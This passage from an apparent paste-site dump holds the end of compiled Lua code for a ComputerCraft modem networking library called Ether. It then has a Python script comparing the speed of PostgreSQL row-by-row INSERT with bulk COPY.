return {Object = Object, Tuple = Tuple, Vector = Vector, abstract = abstract, trait = trait, impl = impl, mixin = mixin, panic = panic, rtti = rtti, operators = {__saturnus_operator_colon_colon_colon = __saturnus_operator_colon_colon_colon, __saturnus_operator_dot_dot = __saturnus_operator_dot_dot, __saturnus_operator_pipe_greater = __saturnus_operator_pipe_greater, __saturnus_operator_less_pipe = __saturnus_operator_less_pipe, __saturnus_operator_plus_interrogation = __saturnus_operator_plus_interrogation, __saturnus_operator_plus_interrogation_interrogation = __saturnus_operator_plus_interrogation_interrogation, __saturnus_operator_plus_plus_interrogation = __saturnus_operator_plus_plus_interrogation, __saturnus_operator_plus_plus_interrogation_interrogation = __saturnus_operator_plus_plus_interrogation_interrogation, __saturnus_operator_minus_interrogation = __saturnus_operator_minus_interrogation, __saturnus_operator_minus_interrogation_interrogation = __saturnus_operator_minus_interrogation_interrogation, __saturnus_operator_times_interrogation = __saturnus_operator_times_interrogation, __saturnus_operator_times_interrogation_interrogation = __saturnus_operator_times_interrogation_interrogation, __saturnus_operator_slash_interrogation = __saturnus_operator_slash_interrogation, __saturnus_operator_slash_interrogation_interrogation = __saturnus_operator_slash_interrogation_interrogation, __saturnus_operator_colon_colon = __saturnus_operator_colon_colon, __saturnus_operator_minus_greater_greater = __saturnus_operator_minus_greater_greater}, ext = ext};
end;
if jit then
  package.loaded[""std""] = _G[""__saturnus_module_std""]();
else
  package.preload[""std""] = _G[""__saturnus_module_std""];
end
-- Generated by the Saturnus compiler 1.0
-- WARNING! Changes may be discarded at any moment!
local __saturnus_spread__ = table.unpack or unpack; -- Lua polyfill
local ev, Promise;
do
  local __destructure__ = require(""tokio"");
  ev = __destructure__.ev;
  Promise = __destructure__.Promise;
end
local Ok, Err;
do
  local __destructure__ = require(""result"");
  Ok = __destructure__.Ok;
  Err = __destructure__.Err;
end
local Object;
do
  local __destructure__ = require(""std"");
  Object = __destructure__.Object;
end
local NoModemError = {};
NoModemError.__meta__ = {};
NoModemError.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
NoModemError.prototype = {};
NoModemError.prototype.__proto__ = NoModemError;
NoModemError.prototype.__meta__ = {};
NoModemError.prototype.__meta__.__index = NoModemError.prototype;
setmetatable(NoModemError, NoModemError.__meta__);
NoModemError.prototype.to_string = function(self)
  return ""No modems attached to this computer!"";
end;
local ProtocolAlreadyExistsError = {};
ProtocolAlreadyExistsError.__meta__ = {};
ProtocolAlreadyExistsError.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
ProtocolAlreadyExistsError.prototype = {};
ProtocolAlreadyExistsError.prototype.__proto__ = ProtocolAlreadyExistsError;
ProtocolAlreadyExistsError.prototype.__meta__ = {};
ProtocolAlreadyExistsError.prototype.__meta__.__index = ProtocolAlreadyExistsError.prototype;
setmetatable(ProtocolAlreadyExistsError, ProtocolAlreadyExistsError.__meta__);
ProtocolAlreadyExistsError.new = function(proto)
  return ProtocolAlreadyExistsError({proto = proto});
end;
ProtocolAlreadyExistsError.prototype.to_string = function(self)
  return ""Protocol "" .. tostring(self.proto) .. "" already registered!"";
end;
local ReservedHostNameError = {};
ReservedHostNameError.__meta__ = {};
ReservedHostNameError.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
ReservedHostNameError.prototype = {};
ReservedHostNameError.prototype.__proto__ = ReservedHostNameError;
ReservedHostNameError.prototype.__meta__ = {};
ReservedHostNameError.prototype.__meta__.__index = ReservedHostNameError.prototype;
setmetatable(ReservedHostNameError, ReservedHostNameError.__meta__);
ReservedHostNameError.new = function(name)
  return ReservedHostNameError({name = name});
end;
ReservedHostNameError.prototype.to_string = function(self)
  return ""Host name "" .. tostring(self.name) .. "" is reserved! Please, choose another."";
end;
local ProtocolDoesNotExistError = {};
ProtocolDoesNotExistError.__meta__ = {};
ProtocolDoesNotExistError.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
ProtocolDoesNotExistError.prototype = {};
ProtocolDoesNotExistError.prototype.__proto__ = ProtocolDoesNotExistError;
ProtocolDoesNotExistError.prototype.__meta__ = {};
ProtocolDoesNotExistError.prototype.__meta__.__index = ProtocolDoesNotExistError.prototype;
setmetatable(ProtocolDoesNotExistError, ProtocolDoesNotExistError.__meta__);
ProtocolDoesNotExistError.new = function(name)
  return ProtocolDoesNotExistError({name = name});
end;
ProtocolDoesNotExistError.prototype.to_string = function(self)
  return ""Protocol "" .. tostring(self.name) .. "" does not exist on this machine!"";
end;
local function find_modem()
  local modem = peripheral.find(""modem"");
  if modem == nil then
    return Err(NoModemError({}));
  end
  return Ok(modem);
end
local function propagate(what)
  local ok, value;
  do
    local __destructure__ = {pcall(what)};
    ok = __destructure__[1];
    value = __destructure__[2];
  end
  if ok then
    return Ok(value);
  end
  return Err(value);
end
local Ether = {};
Ether.__meta__ = {};
Ether.__meta__.__call = function(self, struct)
  return setmetatable(struct, self.prototype.__meta__);
end;
Ether.prototype = {};
Ether.prototype.__proto__ = Ether;
Ether.prototype.__meta__ = {};
Ether.prototype.__meta__.__index = Ether.prototype;
setmetatable(Ether, Ether.__meta__);
Ether.add_protocol = function(name, options)
  return propagate(function(it, ...)
    local rest = {...};
    local modem = find_modem():unwrap();
    modem.open(Ether.BCAST_PORT);
    options = options == nil and {} or options;
    if Ether.protocols[name] ~= nil then
      return Err(ProtocolAlreadyExistsError.new(name));
    end
    options.private = options.private == nil and false or options.private;
    options.channel = options.channel == nil and Ether.DEFAULT_COM or options.channel;
    modem.open(options.channel);
    Ether.protocols[name] = options;
    return Ok(nil);
  end);
end;
Ether.host = function(name)
  return propagate(function(it, ...)
    local rest = {...};
    local modem = find_modem():unwrap();
    modem.open(Ether.BCAST_PORT);
    if name == ""localhost"" then
      return Err(ReservedHostNameError.new(name));
    end
    Ether.hostname = name;
    return Ok(ev:on(""modem_message"", function(_, side, c, rc, message, distance)
      if c == Ether.BCAST_PORT then
        if message.body.request == ""lookup"" then
          Ether.broadcast({response = ""lookup"", name = Ether.hostname, protocols = Ether.protocols});
        end
      end
    end));
  end);
end;
Ether.lookup = function(timeout)
  return Promise.new(function(r)
    local hosts = {};
    local clear = ev:on(""modem_message"", function(_, side, c, rc, message, distance)
      if c == Ether.BCAST_PORT and message.body.response == ""lookup"" then
        hosts[message.body.name] = message.body.protocols;
      end
    end);
    local res = Ether.broadcast({request = ""lookup""});
    if res.is_err() then
      r(res);
    else
      ev:timeout(function()
        clear();
        r(hosts);
      end, timeout == nil and Ether.DEFAULT_LOOKUP_TIMEOUT or timeout);
    end
  end);
end;
Ether.broadcast = function(body)
  return propagate(function(it, ...)
    local rest = {...};
    local modem = find_modem():unwrap();
    local sender_mac = Ether.MAC_ADDRESS;
    local sender = Ether.hostname;
    modem.transmit(Ether.BCAST_PORT, Ether.BCAST_PORT, {sender = sender, sender_mac = sender_mac, body = body});
    return Ok(nil);
  end);
end;
Ether.send = function(target, protocol, body)
  return propagate(function(it, ...)
    local rest = {...};
    local modem = find_modem():unwrap();
    local proto = Ether.protocols[protocol];
    if proto == nil then
      return Err(ProtocolDoesNotExistError.new(protocol));
    end
    local sender_mac = Ether.MAC_ADDRESS;
    local sender = Ether.hostname;
    local payload = {sender = sender, sender_mac = sender_mac, protocol = protocol, target = target, body = body};
    if type(proto.rewrite_transmit) == ""function"" then
      payload = proto.rewrite_transmit(payload);
    end
    modem.transmit(proto.channel, proto.channel, payload);
    return Ok(nil);
  end);
end;
Ether.on = function(protocol_name, callback)
  return ev:on(""modem_message"", function(_, side, c, rc, message, distance)
    if protocol_name ~= message.protocol then
      return;
    end
    local protocol = Ether.protocols[message.protocol];
    if protocol == nil then
      return;
    end
    if protocol.channel ~= c then
      return;
    end
    if type(protocol.rewrite_receive) == ""function"" then
      message = protocol.rewrite_receive(message);
    end
    if message.target ~= Ether.hostname and message.target ~= ""*"" then
      return;
    end
    callback(message.body, message);
  end);
end;
Ether.ev = ev;
Ether.BCAST_PORT = 255;
Ether.DEFAULT_COM = 254;
Ether.protocols = {};
Ether.DEFAULT_LOOKUP_TIMEOUT = 2;
Ether.MAC_ADDRESS = os.getComputerID();
return {Ether = Ether, NoModemError = NoModemError, ProtocolAlreadyExistsError = ProtocolAlreadyExistsError, ReservedHostNameError = ReservedHostNameError, ProtocolDoesNotExistError = ProtocolDoesNotExistError, find_modem = find_modem};"
f1EEyYuH,insert into vs copy,Vlad213132133,Python,Tuesday 2nd of January 2024 11:58:03 AM CDT,"# INSERT INTO

import json
import psycopg2
import time

start_time = time.time()
PSQL_CREDS_PATH = '/Users/v.lytvyniuk/Documents/cren/atlantys.json'

with open(PSQL_CREDS_PATH, ""r"") as read_file:
    psql_creds = json.load(read_file)

psql_conn = psycopg2.connect(**psql_creds)
psql_cursor = psql_conn.cursor()

t =  {
    ""created_at"" : '2016-04-04T13:22:41Z',
    ""updated_at"" : '2021-10-19T19:51:09Z',
    ""id"" : '0',
    ""card_uri"" : 'card://1019782334088802304111',
    ""name"" : 'Trust',
    ""card_type"" : 'IMAGE_WEBSITE2'
}
for i in range(0, 100000):
    t['id'] = i
    psql_cursor.execute('''
        INSERT INTO sand_vlad.twitter_cards_test (created_at, updated_at, id, card_uri, ""name"", card_type)
        SELECT %(created_at)s, %(updated_at)s, %(id)s, %(card_uri)s, %(name)s, %(card_type)s
        ON CONFLICT (""id"") DO UPDATE SET name = EXCLUDED.name;
    ''', t)
    if i % 10000 == 0 and i > 0:        
        psql_conn.commit()
        print('commit on rows:', i)

psql_conn.commit()
psql_cursor.close()
psql_conn.close()    

print(""--- %s seconds ---"" % (time.time() - start_time))
#--- 3914.49631524086 seconds ---    



# COPY 
import json
import psycopg2
from io import StringIO
import time

start_time = time.time()  
PSQL_CREDS_PATH = '/Users/v.lytvyniuk/Documents/cren/atlantys.json'

with open(PSQL_CREDS_PATH, ""r"") as read_file:
    psql_creds = json.load(read_file)

psql_conn = psycopg2.connect(**psql_creds)
psql_cursor = psql_conn.cursor()

r = ['2016-04-04T13:22:41Z', '2021-10-19T19:51:09Z', '0', 'card://1019782334088802304111', 'Trust', 'IMAGE_WEBSITE2']
f = StringIO()
for i in range(0, 100000):
    r[2] = str(i)
    d = ','.join(map(str, r))
    f.write(f""{d}\n"")
    
f.seek(0)

psql_cursor.copy_expert(
    """"""
    CREATE TABLE sand_vlad.twitter_cards_test_temp (
        created_at timestamp NULL,
        updated_at timestamp NULL,
        ""id"" text NOT NULL,
        card_uri text NULL,
        ""name"" text NULL,
        card_type text NULL
    );
    
    COPY sand_vlad.twitter_cards_test_temp  FROM STDIN WITH (FORMAT CSV, DELIMITER ',') ;
    insert into twitter_cards_test select * from sand_vlad.twitter_cards_test_temp ON CONFLICT (""id"") DO UPDATE SET ""name"" = EXCLUDED.""name""; 
    DROP TABLE sand_vlad.twitter_cards_test_temp;        
    """""",
    f,
)

psql_conn.commit()
psql_cursor.close()
psql_conn.close()

print(""--- %s seconds ---"" % (time.time() - start_time))
#--- 2.8959779739379883 seconds ---"
